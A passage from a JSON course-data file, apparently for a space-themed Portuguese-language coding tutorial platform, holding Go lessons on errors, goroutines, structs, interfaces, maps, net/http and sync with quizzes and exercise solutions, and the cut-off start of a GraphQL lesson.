        "codeExample": "// Programa Canônico em Go\npackage main\n\nimport (\n    \"fmt\"\n    \"errors\"\n)\n\nfunc dividirEnergia(total int, divisores int) (int, error) {\n    if divisores == 0 {\n        return 0, errors.New(\"divisão por zero impossível no reator\")\n    }\n    return total / divisores, nil\n}\n\nfunc main() {\n    resultado, err := dividirEnergia(100, 4)\n    if err != nil {\n        fmt.Println(\"Erro:\", err)\n        return\n    }\n    fmt.Printf(\"Energia por propulsor: %d MW\\n\", resultado)\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual é o padrão oficial e idiomático da linguagem Go para lidar com falhas e erros em funções?",
            "options": [
              "Lançar exceções com a palavra-chave throw e capturar com blocos try/catch.",
              "Retornar o erro explicitamente como o último valor do retorno da função e checá-lo com \"if err != nil\".",
              "O compilador Go proíbe qualquer tipo de erro de acontecer.",
              "Escrever todos os erros em um arquivo .log oculto sem avisar o chamador."
            ],
            "correctIndex": 1,
            "explanation": "Go não utiliza try/catch. Em vez disso, funções retornam (valor, error) e o desenvolvedor verifica explicitamente if err != nil, garantindo que nenhum erro passe despercebido."
          },
          {
            "type": "fillblank",
            "title": "Declarando Variáveis com Inferência Rápida",
            "instruction": "Preencha o operador de declaração curta de variáveis idiomático do Go.",
            "codeSnippet": "piloto {{operador_curto}} \"Comandante Lynx\"",
            "blanks": [
              {
                "id": "operador_curto",
                "placeholder": "operador curto",
                "expectedValues": [
                  ":="
                ],
                "hint": "Combinação de dois pontos e igual usada para declarar e inferir tipo em Go."
              }
            ],
            "explanation": "Perfeito! O operador := declara a variável e infere o tipo string automaticamente em tempo de compilação."
          }
        ]
      },
      {
        "id": "go-2",
        "title": "2. Concorrência Hiperespacial: Goroutines & Channels",
        "description": "Execute milhões de tarefas simultâneas com goroutines leves e canais de comunicação seguros.",
        "duration": 17,
        "xpReward": 65,
        "language": "go",
        "content": "# 🚀 Goroutines & Channels: Concorrência Hiperespacial\n\nEnquanto a maioria das linguagens briga com threads pesadas do sistema operacional (onde criar mil threads esgota a memória do servidor), Go foi projetado desde o primeiro dia para **concorrência massiva**.\n\n---\n\n### 💨 O que é uma Goroutine?\n\nUma **Goroutine** é uma thread gerenciada pelo próprio runtime do Go, e não pelo sistema operacional.\n- Uma thread tradicional consome cerca de **1 MB** de memória.\n- Uma Goroutine consome apenas **2 KB**! Você pode rodar **centenas de milhares** de Goroutines simultâneas no mesmo servidor sem engasgar.\n\nPara transformar qualquer função em uma tarefa concorrente:\n```go\ngo dispararPropulsor(\"Motor Alpha\") // Executa em paralelo instantaneamente!\n```\n\n---\n\n### 📬 Channels: Comunicação Sem Conflitos\n\nO lema sagrado do Go é:  \n> *\"Não se comunique compartilhando memória; compartilhe memória se comunicando.\"*\n\nPara transferir dados com segurança entre diferentes Goroutines sem precisar de travas complexas (*mutex*), usamos **Channels** (Canais):\n\n```go\n// 1. Criar um canal de strings\nmensagens := make(chan string)\n\n// 2. Enviar dado para o canal dentro de uma goroutine\ngo func() {\n    mensagens <- \"Sinal de Dobra Recebido!\" // Operador <- empurra o dado\n}()\n\n// 3. Receber o dado no processo principal\nresultado := <-mensagens // Operador <- extrai o dado\nfmt.Println(resultado)\n```\n\n> **💡 Dica Pro:**\n> O envio e o recebimento em canais não-bufferizados bloqueiam a execução até que o outro lado esteja pronto. Isso cria uma sincronização perfeita automática entre tarefas assíncronas!\n\n> **⚠️ Armadilha Comum:**\n> Tentar ler de um canal onde nenhuma Goroutine está mais escrevendo nem o canal foi fechado gera um erro fatal em tempo de execução: `fatal error: all goroutines are asleep - deadlock!`.",
        "codeExample": "// Processando Telemetria Concorrente em Go\npackage main\n\nimport \"fmt\"\n\nfunc escanearSetor(setor int, canal chan string) {\n    canal <- fmt.Sprintf(\"Setor %d mapeado com sucesso!\", setor)\n}\n\nfunc main() {\n    telemetria := make(chan string)\n\n    // Dispara 3 escaneamentos em paralelo\n    go escanearSetor(1, telemetria)\n    go escanearSetor(2, telemetria)\n    go escanearSetor(3, telemetria)\n\n    // Coleta as 3 respostas\n    for i := 0; i < 3; i++ {\n        fmt.Println(<-telemetria)\n    }\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "O que a palavra-chave \"go\" faz quando colocada antes da chamada de uma função (ex: go coletarDados())?",
            "options": [
              "Converte a função em um arquivo PDF para download.",
              "Inicia a execução da função em segundo plano de forma concorrente em uma nova Goroutine.",
              "Compila a função para a linguagem C.",
              "Cancela a execução de todas as outras funções do programa."
            ],
            "correctIndex": 1,
            "explanation": "A palavra go inicia uma Goroutine imediatamente, permitindo que a função execute em paralelo de maneira ultraleve sem bloquear a thread principal."
          },
          {
            "type": "code",
            "instruction": "Escreva a linha de código em Go para criar um canal síncrono de inteiros chamado canalNumeros usando a função make.",
            "initialCode": "// Crie o canal abaixo\n",
            "expectedKeywords": [
              "canalNumeros := make(chan int)"
            ],
            "hint": "Use a sintaxe: canalNumeros := make(chan int).",
            "solution": "canalNumeros := make(chan int)"
          }
        ]
      },
      {
        "id": "go-3",
        "title": "3. Structs, Métodos e Ponteiros em Go",
        "description": "Crie estruturas de dados eficientes, entenda referências com ponteiros (& e *) e use receiver functions.",
        "duration": 16,
        "xpReward": 65,
        "language": "go",
        "content": "# 🐹 Structs, Métodos e Ponteiros em Go\n\nPropulsão supersônica no Núcleo Supersônico! O Go foi criado no Google com foco em simplicidade, velocidade e economia de recursos. Ele dispensa classes tradicionais em favor de **Structs** leves e **Ponteiros** explícitos.\n\n> **💡 O que são Ponteiros em Go?**\n> Um ponteiro armazena o **endereço de memória** de uma variável.\n> - `&`: Obtém o endereço de memória de uma variável (`&x`).\n> - `*`: Desreferencia o ponteiro, permitindo ler ou alterar o valor armazenado naquele endereço (`*ptr`).\n\n---\n\n### 🏗️ Structs e Métodos com Receivers\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype Nave struct {\n    Modelo    string\n    Escudo    int\n    Velocidade int\n}\n\n// 1. Value Receiver: recebe uma CÓPIA da struct (não altera a original!)\nfunc (n Nave) ExibirStatus() {\n    fmt.Printf(\"Nave %s | Escudos: %d%%\n\", n.Modelo, n.Escudo)\n}\n\n// 2. Pointer Receiver: recebe o PONTEIRO da struct (altera o valor original na memória!)\nfunc (n *Nave) AplicarDano(dano int) {\n    n.Escudo -= dano\n    if n.Escudo < 0 {\n        n.Escudo = 0\n    }\n}\n```\n\n---\n\n### 🎯 Quando usar Pointer Receivers (`*T`)?\n\n1. Quando o método precisa **modificar o estado** da struct.\n2. Quando a struct for muito grande: passar um ponteiro copia apenas 8 bytes (endereço de memória) em vez de duplicar a struct inteira na memória RAM!\n\n```go\nfunc main() {\n    // Instanciação elegante\n    nave := Nave{Modelo: \"Nexus Star\", Escudo: 100}\n    \n    nave.AplicarDano(35) // O Go converte automaticamente para (&nave).AplicarDano!\n    nave.ExibirStatus()  // Escudo: 65%\n}\n```\n\n> **⚠️ Armadilha Comum:**\n> Esquecer o asterisco no receiver: `func (n Nave) Alterar()`. Se você alterar `n.Escudo` com um value receiver, estará alterando apenas uma cópia efêmera que desaparece assim que a função termina!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Seja consistente: se um método de uma struct usa um Pointer Receiver (`*Nave`), declare todos os outros métodos daquela struct com Pointer Receiver também.\n- Use a função construtora idiomática `NewNomeDaStruct` retornando um ponteiro: `func NewNave(modelo string) *Nave`.\n\n> **🛡️ Regra de Ouro:**\n> O Go possui ponteiros para eficiência de memória, mas não possui aritmética de ponteiros arriscada como C/C++, tornando-o veloz e seguro.",
        "codeExample": "func NewNave(modelo string) *Nave {\n    return &Nave{\n        Modelo: modelo,\n        Escudo: 100,\n    }\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Em Go, qual é a principal diferença entre definir um método com Value Receiver (n Nave) versus Pointer Receiver (n *Nave)?",
            "options": [
              "Value Receiver compila em JavaScript e Pointer Receiver em C.",
              "Value Receiver opera sobre uma cópia da struct sem alterar a original, enquanto Pointer Receiver altera diretamente a struct na memória original.",
              "Pointer Receiver não aceita parâmetros numéricos.",
              "Value Receiver só pode ser usado no arquivo main.go."
            ],
            "correctIndex": 1,
            "explanation": "O Pointer Receiver (*Nave) recebe a referência de memória, permitindo mutação real de dados e evitando duplicações desnecessárias na memória."
          },
          {
            "type": "code",
            "instruction": "Escreva a assinatura de um método chamado \"Acelerar\" que não retorna nada e use um Pointer Receiver \"(n *Nave)\".",
            "initialCode": "// Escreva a assinatura do método aqui\n",
            "expectedKeywords": [
              "func (n *Nave) Acelerar() {"
            ],
            "hint": "Use: func (n *Nave) Acelerar() {\n}",
            "solution": "func (n *Nave) Acelerar() {\n}"
          }
        ]
      },
      {
        "id": "go-4",
        "title": "4. Interfaces Implícitas e Composição",
        "description": "Construa código desacoplado com Duck Typing estático (interfaces implícitas) e Composição de structs.",
        "duration": 16,
        "xpReward": 65,
        "language": "go",
        "content": "# 🧩 Interfaces Implícitas e Composição\n\nFilosofia pura no Núcleo Supersônico! O design do Go é reverenciado por romper com a herança rígida tradicional. Em Go, não existe a palavra-chave `implements` nem a palavra `extends`.\n\n> **💡 O que é uma Interface Implícita?**\n> \"Se anda como pato e faz quack como pato, é um pato!\"\n> Se uma struct implementar todos os métodos declarados em uma interface, ela **automaticamente cumpre a interface**, sem precisar declarar nada formalmente!\n\n---\n\n### 🦆 A Mágica da Interface Implícita\n\n```go\npackage main\n\nimport \"fmt\"\n\n// 1. A interface define apenas o contrato\ntype Propulsor interface {\n    Ligar() string\n}\n\n// 2. Structs concretas\ntype MotorIonico struct{}\n\nfunc (m MotorIonico) Ligar() string {\n    return \"Propulsão iônica ativada silenciosamente.\"\n}\n\n// 3. Função que consome a interface\nfunc InicializarNave(p Propulsor) {\n    fmt.Println(p.Ligar())\n}\n\nfunc main() {\n    motor := MotorIonico{}\n    InicializarNave(motor) // Funciona 100% de forma desacoplada!\n}\n```\n\n---\n\n### 🧱 Composição de Structs (*Embedding*)\n\nEm vez de herança de classes, usamos composição embutindo structs dentro de outras:\n\n```go\ntype EntidadeBase struct {\n    ID   string\n    Nome string\n}\n\ntype EstacaoEspacial struct {\n    EntidadeBase // Struct embutida! Todos os campos e métodos sobem para a EstacaoEspacial\n    Capacidade int\n}\n\nfunc main() {\n    estacao := EstacaoEspacial{\n        EntidadeBase: EntidadeBase{ID: \"E-10\", Nome: \"Nexus Prime\"},\n        Capacidade:   5000,\n    }\n    // Acesso direto promovido:\n    fmt.Println(estacao.Nome) // \"Nexus Prime\"\n}\n```\n\n> **⚠️ Armadilha Comum:**\n> Criar interfaces gigantescas com 15 métodos. No Go, as interfaces mais aclamadas têm apenas **1 método** (como `io.Reader` com `Read()` e `io.Writer` com `Write()`). Mantenha suas interfaces cirurgicamente pequenas!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- A interface vazia `any` (antigo `interface{}`) aceita qualquer tipo, mas use com extrema moderação para não perder a segurança de tipos do Go.\n- Declare as interfaces no pacote que as consome, e não no pacote que as implementa.\n\n> **🛡️ Regra de Ouro:**\n> \"Quanto maior a interface, mais fraca a abstração.\" — Provérbio oficial de Go (Rob Pike).",
        "codeExample": "type Disparador interface {\n    Disparar() error\n}\n\nfunc ExecutarAtaque(d Disparador) error {\n    return d.Disparar()\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Como uma struct em Go indica formalmente que cumpre o contrato exigido por uma determinada interface?",
            "options": [
              "Adicionando a palavra implements NomeDaInterface ao lado da struct.",
              "A satisfação é puramente implícita: basta a struct implementar todos os métodos requeridos pela interface com as mesmas assinaturas.",
              "Herdando da classe abstrata da interface com extends.",
              "Registrando a struct em um arquivo XML de configuração."
            ],
            "correctIndex": 1,
            "explanation": "O Go utiliza tipagem estrutural implícita: se o tipo possui o conjunto de métodos da interface, ele a implementa automaticamente."
          },
          {
            "type": "code",
            "instruction": "Escreva a declaração de uma interface chamada \"Ativavel\" contendo um único método \"Ativar() bool\".",
            "initialCode": "// Declare a interface Ativavel aqui\n",
            "expectedKeywords": [
              "type Ativavel interface {",
              "Ativar() bool",
              "}"
            ],
            "hint": "Use: type Ativavel interface {\n    Ativar() bool\n}",
            "solution": "type Ativavel interface {\n    Ativar() bool\n}"
          }
        ]
      },
      {
        "id": "go-5",
        "title": "5. Slices, Maps e a Função make",
        "description": "Gerencie coleções elásticas com Slices, mapas de chave-valor e alocação otimizada com make.",
        "duration": 15,
        "xpReward": 65,
        "language": "go",
        "content": "# 📊 Slices, Maps e a Função make\n\nManejo de coleções de dados no Núcleo Supersônico! Em Go, vetores de tamanho fixo (`[5]int`) raramente são usados diretamente. O dia a dia dos desenvolvedores é dominado por **Slices** dinâmicos e **Maps**.\n\n> **💡 O que é um Slice?**\n> Um Slice é uma estrutura leve que aponta para um array subjacente contínuo na memória. Ele é composto por três componentes:\n> 1. **Ponteiro**: Onde os dados começam na memória.\n> 2. **Tamanho (`len`)**: Quantos elementos existem no slice atualmente.\n> 3. **Capacidade (`cap`)**: O total de elementos que o array subjacente suporta antes de precisar ser realocado.\n\n---\n\n### 🍕 Criando Slices com `append` e `make`\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc main() {\n    // 1. Criando com make: tamanho 0, capacidade para 10 elementos reservados\n    naves := make([]string, 0, 10)\n\n    // 2. Adicionando itens com a função nativa append:\n    naves = append(naves, \"Nexus-One\", \"Apollo\", \"Orion\")\n    \n    fmt.Printf(\"Len: %d, Cap: %d, Itens: %v\n\", len(naves), cap(naves), naves)\n\n    // 3. Fatiando o slice (sub-slice):\n    primeirasDuas := naves[0:2] // [\"Nexus-One\", \"Apollo\"]\n    fmt.Println(primeirasDuas)\n}\n```\n\n---\n\n### 🗺️ Dicionários de Dados com `map`\n\nTabelas hash com busca em tempo constante O(1):\n\n```go\n// Alocando um mapa com chave string e valor int:\npontuacoes := make(map[string]int)\n\npontuacoes[\"Alex\"] = 950\npontuacoes[\"Beatriz\"] = 1200\n\n// A verificação clássica de existência \"comma-ok\":\nvalor, existe := pontuacoes[\"Alex\"]\nif existe {\n    fmt.Println(\"Pontos encontrados:\", valor)\n}\n\n// Removendo uma chave\ndelete(pontuacoes, \"Alex\")\n```\n\n> **⚠️ Armadilha Comum:**\n> Tentar escrever em um mapa nulo (`var m map[string]int; m[\"chave\"] = 1`). Isso dispara um **panic** imediato! Sempre inicialize o mapa com `make(map[string]int)` ou com literal `map[string]int{}` antes de gravar.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Pré-aloque a capacidade com `make([]T, 0, capacidadeEstimada)` quando souber aproximadamente quantos itens serão inseridos. Isso evita realocações consecutivas na memória.\n- Ao iterar sobre slices ou mapas, utilize a estrutura idiomática `for indice, valor := range colecao { ... }`.\n\n> **🛡️ Regra de Ouro:**\n> O `append` sempre retorna um novo cabeçalho de slice; certifique-se de atribuir de volta à mesma variável (`s = append(s, x)`).",
        "codeExample": "func filtrarPositivos(numeros []int) []int {\n    resultado := make([]int, 0, len(numeros))\n    for _, n := range numeros {\n        if n > 0 {\n            resultado = append(resultado, n)\n        }\n    }\n    return resultado\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Em Go, qual padrão idiomático (conhecido como \"comma-ok\") é utilizado para testar com segurança se uma chave existe dentro de um map?",
            "options": [
              "if map.hasKey(\"alvo\") { ... }",
              "valor, ok := meuMapa[\"alvo\"]; if ok { ... }",
              "if exists(meuMapa, \"alvo\") { ... }",
              "try { meuMapa[\"alvo\"] } catch { ... }"
            ],
            "correctIndex": 1,
            "explanation": "O acesso a maps em Go retorna dois valores: o valor associado e um booleano (ok) indicando a existência real da chave."
          },
          {
            "type": "code",
            "instruction": "Escreva a linha de código em Go que utilize a função make para criar um slice de inteiros com tamanho inicial 0 e capacidade 5 na variável \"itens\".",
            "initialCode": "// Crie o slice itens aqui com make\n",
            "expectedKeywords": [
              "itens := make([]int, 0, 5)"
            ],
            "hint": "Use: itens := make([]int, 0, 5)",
            "solution": "itens := make([]int, 0, 5)"
          }
        ]
      },
      {
        "id": "go-6",
        "title": "6. Tratamento Idiomático de Erros com error",
        "description": "Construa programas resilientes sem exceptions com a interface error e checagens explícitas if err != nil.",
        "duration": 16,
        "xpReward": 65,
        "language": "go",
        "content": "# 🚨 Tratamento Idiomático de Erros com error\n\nFilosofia anti-exceção no Núcleo Supersônico! Ao contrário de outras linguagens que utilizam blocos invisíveis de `try/catch` que interrompem o fluxo do código aleatoriamente, o Go trata **erros como valores de primeira classe**.\n\n> **💡 A Interface `error`**\n> Em Go, um erro é simplesmente qualquer tipo que implemente a interface embutida mais famosa da linguagem:\n> ```go\n> type error interface {\n>     Error() string\n> }\n> ```\n\n---\n\n### 🛡️ O Idioma Sagrado: `if err != nil`\n\nFunções que podem falhar retornam o resultado e o erro como **último valor de retorno**:\n\n```go\npackage main\n\nimport (\n    \"errors\"\n    \"fmt\"\n)\n\nfunc CalcularOrbita(velocidade int) (float64, error) {\n    if velocidade <= 0 {\n        return 0, errors.New(\"velocidade deve ser estritamente superior a zero\")\n    }\n    return float64(velocidade) * 1.414, nil // nil indica ausência de erro!\n}\n\nfunc main() {\n    orbita, err := CalcularOrbita(-50)\n    if err != nil {\n        fmt.Println(\"Erro de telemetria:\", err)\n        return // Trata o erro imediatamente e sai!\n    }\n\n    fmt.Println(\"Órbita calculada com sucesso:\", orbita)\n}\n```\n\n---\n\n### 🎁 Formatando e Envolvendo Erros com `fmt.Errorf` e `%w`\n\nDesde o Go 1.13, você pode empilhar contexto aos erros com o verbo `%w` (*wrap*):\n\n```go\nfunc IniciarSistemas() error {\n    if err := ligarReator(); err != nil {\n        return fmt.Errorf(\"falha na inicialização do setor primário: %w\", err)\n    }\n    return nil\n}\n```\n\nPara verificar se um erro envelopado contém uma falha específica, usamos `errors.Is(err, ErroReator)`.\n\n> **⚠️ Armadilha Comum:**\n> Ignorar o erro atribuindo-o ao caractere de descarte (`res, _ := MinhaFuncao()`). Fazer isso oculta falhas críticas e gera travamentos misteriosos adiante no código. Trate sempre `if err != nil`!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Mantenha o \"caminho feliz\" alinhado à esquerda: trate os erros dentro do `if err != nil` e retorne antecipadamente (*early return*), deixando o fluxo principal limpo e sem aninhamentos profundos.\n- Mensagens de erro em Go **não devem começar com letra maiúscula nem terminar com ponto final** (ex: `errors.New(\"conexão perdida\")`).\n\n> **🛡️ Regra de Ouro:**\n> Erros em Go são explícitos e visíveis no fluxo do código, eliminando surpresas ocultas em tempo de execução.",
        "codeExample": "import (\n    \"errors\"\n    \"fmt\"\n)\n\nvar ErrBateriaFraca = errors.New(\"carga insuficiente para salto hiperespacial\")\n\nfunc ExecutarSalto(carga int) error {\n    if carga < 20 {\n        return ErrBateriaFraca\n    }\n    return nil\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Em Go, qual é a convenção recomendada para formatação do texto da mensagem de erro criada com errors.New()?",
            "options": [
              "Deve ser toda em maiúsculas e terminar com três exclamações.",
              "Deve começar com letra minúscula e não conter ponto final no término (ex: \"porta inacessível\").",
              "Deve ser formatada obrigatoriamente como JSON.",
              "Deve começar com a palavra EXCEPTION em negrito."
            ],
            "correctIndex": 1,
            "explanation": "Pelas diretrizes oficiais da comunidade Go, mensagens de erro são pequenas e concisas, sem maiúscula inicial nem ponto final, pois costumam ser compostas e encadeadas."
          },
          {
            "type": "code",
            "instruction": "Escreva a verificação condicional em Go para verificar se a variável \"err\" não é nula (if err != nil), retornando o próprio \"err\".",
            "initialCode": "// Escreva a verificação if err != nil aqui\n",
            "expectedKeywords": [
              "if err != nil {",
              "return err",
              "}"
            ],
            "hint": "Use: if err != nil {\n    return err\n}",
            "solution": "if err != nil {\n    return err\n}"
          }
        ]
      },
      {
        "id": "go-7",
        "title": "7. Servidores Web HTTP com o Pacote net/http",
        "description": "Construa APIs REST de alta performance usando exclusivamente a biblioteca padrão nativa net/http sem dependências.",
        "duration": 17,
        "xpReward": 65,
        "language": "go",
        "content": "# 🌐 Servidores Web HTTP com o Pacote net/http\n\nVelocidade pura no Núcleo Supersônico! Em muitas linguagens, para construir um servidor web você precisa instalar dezenas de bibliotecas externas pesadas. Em Go, o pacote padrão nativo **`net/http`** é tão incrivelmente rápido e robusto que grandes empresas globais o utilizam diretamente em produção.\n\n> **💡 A Biblioteca Padrão `net/http`**\n> O pacote fornece suporte nativo completo para HTTP/1.1 e HTTP/2, multiplexadores de rotas e manipuladores de requisições concorrentes ultrarrápidos (cada requisição roda automaticamente em sua própria Goroutine!).\n\n---\n\n### 🚀 Criando uma API REST Nativa\n\n```go\npackage main\n\nimport (\n    \"encoding/json\"\n    \"net/http\"\n)\n\ntype RespostaStatus struct {\n    Mensagem string `json:\"mensagem\"`\n    Versao   string `json:\"versao\"`\n}\n\nfunc lidarComStatus(w http.ResponseWriter, r *http.Request) {\n    // Configura o cabeçalho JSON\n    w.Header().Set(\"Content-Type\", \"application/json\")\n    w.WriteHeader(http.StatusOK)\n\n    resposta := RespostaStatus{\n        Mensagem: \"Núcleo Supersônico totalmente operacional\",\n        Versao:   \"2.026\",\n    }\n\n    json.NewEncoder(w).Encode(resposta)\n}\n\nfunc main() {\n    // Registra a rota\n    http.HandleFunc(\"/api/status\", lidarComStatus)\n\n    // Inicializa o servidor na porta 8080\n    println(\"Servidor ativo na porta :8080\")\n    http.ListenAndServe(\":8080\", nil)\n}\n```\n\n---\n\n### 🧩 Anatomia do Handler: `w` e `r`\n\n- **`w http.ResponseWriter`**: O objeto onde você escreve os cabeçalhos de resposta, código de status HTTP (`200`, `404`) e o corpo da resposta.\n- **`r *http.Request`**: O ponteiro que contém tudo que o cliente enviou: método (`r.Method`), parâmetros de URL, cabeçalhos e corpo (`r.Body`).\n\n> **⚠️ Armadilha Comum:**\n> Esquecer de fechar o corpo da requisição ao ler dados enviados pelo cliente: `defer r.Body.Close()`. Sem isso, sockets de rede podem ficar abertos consumindo recursos do sistema operacional.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Utilize `json.NewEncoder(w).Encode(obj)` para serializar JSON direto na resposta de rede: é mais rápido e consome menos memória do que usar `json.Marshal`.\n- Configure timeouts no servidor utilizando a struct `&http.Server{ ReadTimeout: 5 * time.Second }` para evitar que conexões lentas prendam recursos da máquina.\n\n> **🛡️ Regra de Ouro:**\n> Em Go, a biblioteca padrão é de qualidade industrial; use frameworks de terceiros apenas quando houver um requisito muito específico comprovado.",
        "codeExample": "func handlePing(w http.ResponseWriter, r *http.Request) {\n    w.Write([]byte(\"PONG\"))\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Em um handler HTTP padrão do Go (func(w http.ResponseWriter, r *http.Request)), como o servidor lida com múltiplas requisições simultâneas de clientes diferentes?",
            "options": [
              "Ele enfileira todas e processa uma por uma de forma estritamente sequencial.",
              "Ele dispara uma Goroutine leve independente para atender cada conexão concorrentemente.",
              "Ele desliga o servidor se houver mais de duas conexões.",
              "Ele delega a execução para o navegador do cliente."
            ],
            "correctIndex": 1,
            "explanation": "O servidor net/http do Go cria automaticamente uma Goroutine dedicada para cada requisição recebida, proporcionando alta concorrência nativa."
          },
          {
            "type": "code",
            "instruction": "Escreva a linha de código em Go para iniciar o servidor web na porta \":3000\" usando \"http.ListenAndServe\".",
            "initialCode": "// Inicialize o servidor na porta :3000 aqui\n",
            "expectedKeywords": [
              "http.ListenAndServe(\":3000\", nil)"
            ],
            "hint": "Use: http.ListenAndServe(\":3000\", nil)",
            "solution": "http.ListenAndServe(\":3000\", nil)"
          }
        ]
      },
      {
        "id": "go-8",
        "title": "8. Sincronização Concorrente com sync.WaitGroup e Mutex",
        "description": "Coordene Goroutines paralelas sem condições de corrida usando sync.WaitGroup e proteção de memória com sync.Mutex.",
        "duration": 17,
        "xpReward": 70,
        "language": "go",
        "content": "# 🔒 Sincronização Concorrente com sync.WaitGroup e Mutex\n\nMissão final no Núcleo Supersônico! Você já aprendeu que Goroutines (`go minhaFuncao()`) executam em paralelo com extrema leveza. No entanto, para coordenar tarefas em equipe e proteger dados compartilhados contra corrupção, precisamos de ferramentas de sincronização do pacote **`sync`**.\n\n> **💡 O que é sync.WaitGroup e sync.Mutex?**\n> - **`sync.WaitGroup`**: Um contador sincronizado que faz a função principal aguardar até que todas as Goroutines filhas concluam seu trabalho antes de continuar.\n> - **`sync.Mutex`** (*Mutual Exclusion*): Uma trava que garante que apenas uma Goroutine por vez possa ler ou alterar uma variável crítica compartilhada.\n\n---\n\n### ⏳ Aguardando Goroutines com `sync.WaitGroup`\n\n```go\npackage main\n\nimport (\n    \"fmt\"\n    \"sync\"\n)\n\nfunc escanearPlaneta(id int, wg *sync.WaitGroup) {\n    defer wg.Done() // Decrementa o contador ao final da função!\n    fmt.Printf(\"Sonda %d: Varredura de satélites concluída.\n\", id)\n}\n\nfunc main() {\n    var wg sync.WaitGroup\n\n    for i := 1; i <= 3; i++ {\n        wg.Add(1) // Incrementa o contador para cada sonda\n        go escanearPlaneta(i, &wg)\n    }\n\n    wg.Wait() // Bloqueia a execução até o contador chegar a ZERO!\n    fmt.Println(\"Todos os planetas foram escaneados com sucesso!\")\n}\n```\n\n---\n\n### 🔐 Blindando Variáveis Compartilhadas com `sync.Mutex`\n\nSem o Mutex, múltiplas Goroutines somando um contador causam **Race Conditions** (condições de corrida) e resultados imprevisíveis:\n\n```go\ntype CofreEnergia struct {\n    mu     sync.Mutex\n    energia int\n}\n\nfunc (c *CofreEnergia) Adicionar(valor int) {\n    c.mu.Lock()         // Tranca a porta: ninguém mais entra!\n    defer c.mu.Unlock() // Destranca a porta ao finalizar a função!\n    c.energia += valor\n}\n```\n\n---\n\n### 🏁 O Detector de Corridas do Go\n\nO compilador do Go possui uma ferramenta mágica embutida que detecta colisões de memória automaticamente. Basta rodar com a flag:\n```bash\ngo run -race main.go\n```\n\n> **⚠️ Armadilha Comum:**\n> Passar uma `sync.WaitGroup` ou `sync.Mutex` como parâmetro de função por valor (sem ponteiro `&`). Isso cria uma cópia da trava na memória, fazendo o `Wait()` esperar para sempre em um deadlock fatal! Sempre passe com ponteiro: `*sync.WaitGroup`.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Use sempre `defer wg.Done()` e `defer mu.Unlock()` no início das funções concorrentes para garantir que a trava seja liberada mesmo se a função retornar antecipadamente por erro.\n- Prefira canais (*channels*) para comunicação e transferência de dados entre Goroutines, e reserve Mutex para proteção de estruturas de dados locais.\n\n> **🛡️ Regra de Ouro:**\n> \"Não se comunique compartilhando memória; compartilhe memória comunicando-se.\" — O mandamento sagrado do Go.",
        "codeExample": "var wg sync.WaitGroup\nwg.Add(1)\ngo func() {\n    defer wg.Done()\n    println(\"Processamento quântico concluído\")\n}()\nwg.Wait()",
        "exercises": [
          {
            "type": "quiz",
            "question": "Em Go, qual é a finalidade do método wg.Wait() do pacote sync.WaitGroup?",
            "options": [
              "Ele encerra a execução do sistema operacional imediatamente.",
              "Ele bloqueia a Goroutine atual até que o contador interno do WaitGroup atinja exatamente zero através de chamadas a wg.Done().",
              "Ele redefine a velocidade de conexão da internet.",
              "Ele exclui todas as variáveis da memória RAM."
            ],
            "correctIndex": 1,
            "explanation": "wg.Wait() suspende a execução da rotina atual até que todas as Goroutines registradas com wg.Add() finalizem sua tarefa e chamem wg.Done()."
          },
          {
            "type": "code",
            "instruction": "Escreva a instrução para travar um Mutex chamado \"mu\" com Lock() e agendar o destravamento com \"defer mu.Unlock()\".",
            "initialCode": "// Trave e agende o destravamento do mutex mu aqui\n",
            "expectedKeywords": [
              "mu.Lock()",
              "defer mu.Unlock()"
            ],
            "hint": "Use: mu.Lock()\ndefer mu.Unlock()",
            "solution": "mu.Lock()\ndefer mu.Unlock()"
          }
        ]
      }
    ]
  },
  {
    "id": "graphql",
    "slug": "graphql",
    "name": "GraphQL",
    "planetName": "Matriz Conectiva",
    "description": "A linguagem de consulta para APIs criada pelo Meta. Peça exatamente os dados que precisa, nada mais, nada menos.",
    "icon": "🔮",
    "color": "#E10098",
    "language": "graphql",
    "level": "Intermediário",
    "totalXp": 525,
    "lessons": [
      {
        "id": "graphql-1",
        "title": "1. O Fim do Over-fetching: Consultas Declarativas",
        "description": "Diga adeus a múltiplos endpoints e payloads gigantes. Peça apenas os campos necessários na tela.",
        "duration": 15,
        "xpReward": 65,
        "language": "graphql",
        "content": "# 🔮 O Fim do Over-fetching na Matriz Conectiva\n\nBem-vindo à **Matriz Conectiva**, a central de transmissão de dados do Nexus!\n\nEm 2012, quando os engenheiros do Facebook estavam migrando seus aplicativos móveis para redes celulares lentas, eles enfrentaram dois problemas graves com a arquitetura REST tradicional:\n\n1. **Over-fetching:** O endpoint `/api/usuarios/1` devolvia 40 campos com dados pesados quando o aplicativo móvel precisava apenas do `nome` e da foto de `avatar`.\n2. **Under-fetching:** Para montar uma tela de perfil com as missões e medalhas, o frontend precisava disparar 3 ou 4 requisições HTTP em cascata (`/usuarios/1`, depois `/missoes`, depois `/medalhas`).\n\nPara resolver isso de forma definitiva, eles criaram o **GraphQL**!\n\n---\n\n### 🎯 A Filosofia do GraphQL: O Cliente no Controle\n\nCom GraphQL, a API possui um **único endpoint** (geralmente `/graphql`). O cliente envia uma consulta no formato de documento e recebe exatamente o formato JSON correspondente:\n\n```graphql\n# Consulta enviada pelo frontend:\nquery ObterCadete {\n  cadete(id: \"101\") {\n    nome\n    nivel\n    xp\n  }\n}\n```\n\nO servidor responde com precisão milimétrica:\n```json\n{\n  \"data\": {\n    \"cadete\": {\n      \"nome\": \"Neo\",\n      \"nivel\": 15,\n      \"xp\": 8500\n    }\n  }\n}\n```\n\n---\n\n### 🕸️ Conectando Relacionamentos em Uma Única Viagem\n\nSe você precisar dos dados do cadete e de todas as missões ativas 